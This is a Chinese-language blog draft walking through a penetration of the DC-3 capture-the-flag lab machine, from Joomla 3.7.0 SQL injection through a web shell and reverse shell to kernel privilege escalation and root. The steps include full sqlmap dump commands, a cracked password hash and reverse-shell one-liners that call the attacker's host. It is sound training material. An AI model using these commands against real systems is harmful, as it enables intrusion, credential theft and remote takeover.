+++
date = '2025-12-21T18:50:23+08:00'
draft = true
title = 'DC 3靶场渗透详细过程'
+++

### 一、**环境搭建过程**

(1) 下载DC-3靶场 拖入VMware。

(2) 修改网络适配器为NAT模式

![](image002.png) 



(3) 修改IDE 改为0：0

![](image003.png) 

图2 IDE设置

### 二、**渗透测试过程**

(1)首先进入kali虚拟机打开终端，输入ip addr查询靶场的ip如图1所示，靶场ip为192.168.248.0/24

![](image005.png) 
图3 查询靶场ip

(2)利用namp工具查询目标靶机

Kali虚拟机的ip为192.168.248.135

靶机的ip为192.168.248.136

![](image008.png) 
图4 本机ip和靶机ip

(3)探端口以及服务

利用nmap -A -p- -v命令查询端口开启状况

可以看到80端口是开放的，存在web服务，Apache/2.4.18

![](image010.png) 

图5 靶机的端口及服务开启情况

(4)访问[http://192,168,248,136](http://192,168,248,136) 

![](image012.png) 

图6 访问靶机主页地址

页面显示必须获得权限

(5)安装joomscan

![](image014.png) 

图7 安装joomscan

(6) 利用joomscan --url http://192.168.248.136命令

![](image016.png) 

图8 获取网站后台管理地址

得到joomla版本信息， 版本为3.7.0 也得到了网站后台地址

[http://192.168.248.136/administrator/![](image018.png)](http://192.168.248.136/administrator/)

图9 后台管理登录页面

(7)用nikto扫描获取后台地址

Nikto可以扫描指定主机的WEB类型、主机名、指定目录、特定CGI漏洞、返回主机允许的 http模式等

输入nikto --url [http://192.168.186.131/](http://192.168.186.131/)

![](image020.png) 

图10 nikto扫描结果

(8)输入searchsploit joomla 3.7.0

前面已经知道了joomla的版本是3.7.0

利用searchsploit命令扫描漏洞

![](image021.png) 

图11 searchsploit扫描结果

发现存在一个sql注入漏洞，和xss漏洞

(9)输入 searchsploit -m 42033.txt查看漏洞提示信息

![](image022.png) 

图12 sql注入漏洞提示信息

(10)输入cat 42033.txt查看漏洞文件详细信息

![](image024.png) 

图13 sql注入漏洞详细信息

(11)将把localhost修改为我们的靶机IP，到浏览器去访问

[http://192.168.248.136/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%22](http://192.168.248.136/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%22)

看到提示： 您的SQL语法有错误;说明进行了拼接，存在SQL注入

![](image026.png)  

图14 sql注入漏洞页面

(12) sqlmap扫描

输入sqlmap -u

“http://192.168.248.136/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml”--risk=3 --level=5 --random-agent --dbs -p list[fullordering] –batch

跑出的数据库如图所示

![](image028.png)  

图15sqlmap 跑出的所有数据库

(13)输入 sqlmap -u

"http://192.168.248.136/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml”--risk=3 --level=5 --random-agent --dbs -p list[fullordering]  --current-db –batch获取当前数据库

![](image030.png)  

图16 sqlmap 获取当前数据库

(14)输入 sqlmap -u

"http://192.168.248.136/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 -p list[fullordering] -D "joomladb" --tables --batch

获取到当前数据库中的表

![](image032.png) 

图17   sqlmap 获取joomladb中表的信息

(15)输入sqlmap -u

"http://192.168.186.131/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 -p list[fullordering] -D "joomladb" --tables -T "#__users" --columns

第一个选项选y

![](image034.png) 

图18   sqlmap 获取users表信息1

第二个选项也是y

第三个默认

第四个选10

![](image036.png) 

图19  sqlmap 获取users表信息2

![](image038.png) 

图20   sqlmap 获取到的users表中的关键列

(16)输入sqlmap -u "http://192.168.248.136/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 -p list[fullordering] -D "joomladb" --tables -T "#__users" --columns -C "username,password" --dump --batch

![](image040.png) 

图21   sqlmap 获取到用户名密码

(17)利用jhon破解密码

先创建一个1.txt，把加密的密码字段写入echo ‘$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu’ > 1.txt  

再输入cat 1.txt 打开1.txt文件

在输入jhon 1.txt破解密码

![](image042.png) 

图22   jhon破解密码

(18)在 [http://192.168.248.136/administrator/](http://192.168.248.136/administrator/)网站   

登录  用户名是admin 密码是snoopy

![](image044.png) 

图23   破解后网站首页

点击Extensions,然后弹出一个框，选templates，再选templates

![](image046.png) 

图24 设置界面

进入页面，再点击Beez3 Details and Files

![](image048.png) 

图25 设置界面2

然后点击页面中的new files，可以上传文件

![](image050.png) 

图26  上传文件

![](image052.png) 

图27

在html目录下上传php文件命名为shell.php具体代码如下图所示。

![](image054.png) 

图28 shell.php上传

再次访问[http://192.168.248.136/templates/beez3/html/](http://192.168.248.136/templates/beez3/html/)

可以看到多了shell.php文件

![](image056.png) 

图29文件上传成功

![](image058.png) 

图30文件显示界面

(19)打开中国蚁剑，测试连接

![](image060.png) 

图31连接成功

(20)打开终端输入whoami

是www-data权限

![](image062.png) 

图32 查询whoami权限

(21)反弹shell到kali 输入nc -lvvp 1234

![](image064.png) 

图33 kali开启监听

(22)蚁剑终端输入nc -e /bin/bash 192.168.248.135 1234

![](image066.png) 

图34 -e参数不可用

(23)换个命令使用rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.248.135 1234 >/tmp/f

![](image068.png) 

图35反弹shell成功

(24)交互式shell

 常用的就是python创建交互式shell

 接着输入 python3 -c 'import pty; pty.spawn("/bin/bash")'  点击回车，在输入ls

![](image070.png) 

图36 交互式shell配置成功

(25)上传辅助脚本

下载辅助脚本Linux-Exploit-Suggester.sh

下载地址：https://github.com/mzet-/linux-exploit-suggester

上传脚本，直接在蚁剑里上传，点击右键，选择上传文件，选择刚刚下好的脚本，点击打开上传成功

![](image072.png) 

图37辅助脚本上传成功

(26)输入ls点击回车，发现漏洞   ls -l linux-exploit-suggester.sh

![](image074.png) 

图38发现漏洞

(27)发现没有执行权限，我们给他加个执行文件

输入chmod +x linux-exploit-suggester.sh

和 ./linux-exploit-suggester.sh 发现很多漏洞

![](image076.png)
图39发现漏洞1

![](image078.png) 

图40发现漏洞2

(28)挑选cve-2016-4557漏洞进行提权

![](image080.png) 

图41 挑选漏洞进行提权

(29)输入图片中的url下载文件   然后利用蚁剑上传文件

![](image082.png) 

图42上传漏洞文件

(30)输入ls

unzip 39972.zip 解压文件

![](image084.png)  

图43 解压文件

![](image086.png) 
图44解压成功

(31)输入cd 39772

ls

tar -xvf exploit.tar

cd ebpf_mapfd_doubleput_exploit

![](image088.png)  

图45 逐步提权

(32)输入ls点击回车  输入./compile.sh 点击回车  输入./doubleput.c点击回车

输入ls点击回车    在输入./doubleput点击回车
![](image090.png)

图46 提权成功

(33)输入whoami 获得root权限

![](image092.png)  

图47 获得root权限

(34)输入cd  /root回车

输入ls 回车

cat the-flag.txt回车

![](image094.png) 

图48 拿到flag

